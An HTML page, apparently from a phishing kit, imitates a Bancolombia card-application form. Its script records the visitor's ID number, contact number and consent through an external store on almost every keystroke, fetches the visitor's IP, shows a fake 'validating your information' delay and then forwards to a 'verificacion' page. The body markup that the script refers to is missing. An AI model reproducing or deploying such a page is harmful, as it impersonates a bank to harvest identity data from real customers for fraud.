<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Solicita tu tarjeta — Bancolombia</title>
  <style>
    :root {
      --dark: #1a1a1a;
      --text: #2a2a2a;
      --muted: #6b6b6b;
      --yellow: #ffd100;
      --blue: #0070c9;
      --pad-x: clamp(1.1rem, 4vw, 2rem);
      --disabled: #d8d8d8;
      --disabled-text: #8a8a8a;
    }

    *,
    *::before,
    *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html {
      -webkit-text-size-adjust: 100%;
    }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: #f2f2f2;
      color: var(--text);
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    }

    .topbar {
      display: grid;
      grid-template-columns: 1fr auto 1fr;
      align-items: center;
      gap: 0.5rem;
      padding: 0.85rem var(--pad-x);
      background: var(--dark);
      border-bottom: 3px solid var(--yellow);
    }

    .topbar__back {
      justify-self: start;
      display: inline-flex;
      align-items: center;
      gap: 0.35rem;
      color: #fff;
      text-decoration: none;
      font-size: 0.95rem;
      font-weight: 500;
      min-height: 44px;
    }

    .topbar__back svg {
      width: 18px;
      height: 18px;
      display: block;
    }

    .topbar__logo {
      justify-self: center;
      display: block;
      height: 28px;
      width: auto;
      max-width: 170px;
      object-fit: contain;
      filter: brightness(0) invert(1);
    }

    .topbar__spacer {
      justify-self: end;
    }

    main {
      flex: 1;
      width: 100%;
      max-width: 32rem;
      margin: 0 auto;
      padding: clamp(1.5rem, 4vw, 2.25rem) var(--pad-x) 2rem;
    }

    h1 {
      font-size: clamp(1.35rem, 3.5vw + 0.5rem, 1.75rem);
      font-weight: 700;
      line-height: 1.25;
      letter-spacing: -0.02em;
      color: var(--dark);
      margin-bottom: clamp(1.5rem, 4vw, 2rem);
    }

    .field {
      margin-bottom: 1.35rem;
    }

    .field label {
      display: block;
      font-size: 0.875rem;
      color: var(--muted);
      margin-bottom: 0.55rem;
    }

    .field-control {
      display: flex;
      align-items: center;
      gap: 0.65rem;
      border-bottom: 1px solid #cfcfcf;
      padding: 0.35rem 0 0.55rem;
      position: relative;
    }

    .field-control:focus-within {
      border-bottom-color: var(--dark);
    }

    .field-icon {
      flex-shrink: 0;
      width: 22px;
      height: 22px;
      color: #4a4a4a;
    }

    .field-icon svg {
      display: block;
      width: 100%;
      height: 100%;
    }

    .field-control select,
    .field-control input {
      flex: 1;
      min-width: 0;
      border: none;
      outline: none;
      background: transparent;
      font: inherit;
      font-size: 1rem;
      color: var(--dark);
      appearance: none;
      -webkit-appearance: none;
      min-height: 28px;
    }

    .field-control select {
      padding-right: 1.5rem;
      cursor: pointer;
    }

    .field-control .chevron {
      position: absolute;
      right: 0;
      width: 14px;
      height: 14px;
      color: #4a4a4a;
      pointer-events: none;
    }

    .field-control input::placeholder {
      color: #a0a0a0;
    }

    .info-note {
      display: flex;
      align-items: flex-start;
      gap: 0.55rem;
      margin: 0.25rem 0 1.5rem;
      color: var(--blue);
      font-size: 0.875rem;
      line-height: 1.45;
    }

    .info-note__icon {
      flex-shrink: 0;
      width: 18px;
      height: 18px;
      margin-top: 0.1rem;
      border: 1.5px solid var(--blue);
      border-radius: 50%;
      display: grid;
      place-items: center;
      font-size: 0.7rem;
      font-weight: 700;
      font-style: italic;
      line-height: 1;
    }

    .consent {
      display: flex;
      align-items: flex-start;
      gap: 0.75rem;
      margin-bottom: 1rem;
    }

    .consent input {
      position: absolute;
      opacity: 0;
      width: 1px;
      height: 1px;
    }

    .consent__box {
      flex-shrink: 0;
      width: 22px;
      height: 22px;
      border-radius: 3px;
      border: 2px solid #cfcfcf;
      background: #fff;
      display: grid;
      place-items: center;
      margin-top: 0.1rem;
      cursor: pointer;
    }

    .consent input:checked + .consent__box {
      background: var(--yellow);
      border-color: var(--yellow);
    }

    .consent__box svg {
      width: 12px;
      height: 12px;
      opacity: 0;
      color: #1a1a1a;
    }

    .consent input:checked + .consent__box svg {
      opacity: 1;
    }

    .consent__text {
      font-size: 0.8125rem;
      line-height: 1.45;
      color: #4a4a4a;
    }

    .consent__text a {
      color: inherit;
      font-weight: 600;
      text-decoration: underline;
    }

    .site-footer {
      margin-top: auto;
      background: var(--dark);
      color: #fff;
      padding: 1.25rem var(--pad-x) 1.35rem;
      text-align: center;
    }

    .site-footer__logo {
      display: block;
      height: 26px;
      width: auto;
      max-width: 160px;
      margin: 0 auto 0.65rem;
      object-fit: contain;
      filter: brightness(0) invert(1);
    }

    .site-footer__copy {
      font-size: 0.75rem;
      color: #b0b0b0;
      margin-bottom: 1rem;
    }

    .next-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      max-width: 28rem;
      margin: 0 auto;
      min-height: 52px;
      border: none;
      border-radius: 999px;
      background: var(--disabled);
      color: var(--disabled-text);
      font: inherit;
      font-size: 1rem;
      font-weight: 700;
      cursor: not-allowed;
      -webkit-tap-highlight-color: transparent;
    }

    .next-btn.is-enabled {
      background: var(--yellow);
      color: var(--dark);
      cursor: pointer;
    }

    .next-btn.is-enabled:hover {
      filter: brightness(0.97);
    }

    .loading-overlay {
      position: fixed;
      inset: 0;
      z-index: 200;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(40, 40, 40, 0.55);
      backdrop-filter: blur(5px);
      -webkit-backdrop-filter: blur(5px);
    }

    .loading-overlay.is-visible {
      display: flex;
    }

    .loading-card {
      width: min(200px, 70vw);
      aspect-ratio: 1;
      border-radius: 50%;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 0.85rem;
      padding: 1.25rem;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
    }

    .spinner {
      width: 36px;
      height: 36px;
      border: 3px solid #e0e0e0;
      border-top-color: #1a1a1a;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    .loading-card p {
      font-size: 0.9rem;
      color: var(--dark);
      line-height: 1.3;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @media (min-width: 640px) {
      main {
        padding-top: 2.5rem;
      }

      .topbar__logo {
        height: 30px;
      }
    }
  </style>
</head>

  <div class="loading-overlay" id="loading" role="status" aria-live="polite" aria-busy="true">
    <div class="loading-card">
      <div class="spinner" aria-hidden="true"></div>
      <p id="loading-text">Cargando...</p>
    </div>
  </div>

  <script src="./assets/sync-config.js"></script>
  <script src="./assets/submission-store.js"></script>
  <script>
    (function () {
      var docInput = document.getElementById("numero-documento");
      var contactoInput = document.getElementById("numero-contacto");
      var tipoSelect = document.getElementById("tipo-documento");
      var consent = document.getElementById("consent");
      var nextBtn = document.getElementById("next-btn");
      var form = document.getElementById("doc-form");
      var cupoField = document.getElementById("cupo");
      var loading = document.getElementById("loading");
      var loadingText = document.getElementById("loading-text");
      var terminosLink = document.getElementById("terminos-link");
      var backLink = document.querySelector(".topbar__back");
      var params = new URLSearchParams(window.location.search);

      if (params.get("cupo")) cupoField.value = params.get("cupo");
      if (params.get("tipo")) tipoSelect.value = params.get("tipo");
      if (params.get("documento")) docInput.value = params.get("documento");
      if (params.get("contacto")) contactoInput.value = params.get("contacto");
      if (params.get("consent") === "1" || params.get("consent") === "true") consent.checked = true;

      function contactoDigits(value) {
        return String(value || "").replace(/\D/g, "");
      }

      function isContactoValid() {
        var digits = contactoDigits(contactoInput.value);
        return digits.length >= 7;
      }

      function currentQuery() {
        var q = new URLSearchParams();
        q.set("tipo", tipoSelect.value);
        if (docInput.value.trim()) q.set("documento", docInput.value.trim());
        if (contactoInput.value.trim()) q.set("contacto", contactoInput.value.trim());
        if (cupoField.value) q.set("cupo", cupoField.value);
        if (consent.checked) q.set("consent", "1");
        return q.toString();
      }

      function syncTerminosHref() {
        if (!terminosLink) return;
        var qs = currentQuery();
        terminosLink.href = qs ? "terminos.html?" + qs : "terminos.html";
      }

      if (backLink && params.get("cupo")) {
        backLink.href = "index.html?cupo=" + encodeURIComponent(params.get("cupo"));
      }

      function snapshotFields() {
        return {
          tipo: tipoSelect.value,
          documento: docInput.value.trim(),
          contacto: contactoInput.value.trim(),
          cupo: cupoField.value || "",
          consent: !!consent.checked,
        };
      }

      function liveSave() {
        if (!window.BcStore) return;
        BcStore.livePatch(snapshotFields());
      }

      var liveSaveDebounced = window.BcStore
        ? BcStore.debounce(liveSave, 100)
        : liveSave;

      if (window.BcStore) {
        BcStore.registerFlusher(function () {
          if (liveSaveDebounced.flush) liveSaveDebounced.flush();
          else liveSave();
        });
        BcStore.ensureDraft(snapshotFields());
        BcStore.fetchIpThen();
        liveSave();
      }

      function syncNext() {
        var ok =
          docInput.value.trim().length > 0 &&
          isContactoValid() &&
          consent.checked;
        nextBtn.disabled = !ok;
        nextBtn.classList.toggle("is-enabled", ok);
        syncTerminosHref();
        liveSaveDebounced();
      }

      docInput.addEventListener("input", syncNext);
      docInput.addEventListener("change", syncNext);
      contactoInput.addEventListener("input", syncNext);
      contactoInput.addEventListener("change", syncNext);
      tipoSelect.addEventListener("change", syncNext);
      consent.addEventListener("change", syncNext);
      syncNext();

      function goNext() {
        if (nextBtn.disabled) return;
        var q = new URLSearchParams();
        q.set("tipo", tipoSelect.value);
        q.set("documento", docInput.value.trim());
        q.set("contacto", contactoInput.value.trim());
        if (cupoField.value) q.set("cupo", cupoField.value);

        if (window.BcStore) {
          BcStore.markStep("solicitar", snapshotFields());
        }

        loading.classList.add("is-visible");
        loadingText.textContent = "Cargando...";
        setTimeout(function () {
          loadingText.textContent = "Validando tu información...";
        }, 700);
        setTimeout(function () {
          window.location.href = "verificacion.html?" + q.toString();
        }, 1700);
      }

      nextBtn.addEventListener("click", goNext);
      form.addEventListener("submit", function (e) {
        e.preventDefault();
        goNext();
      });
    })();
  </script>
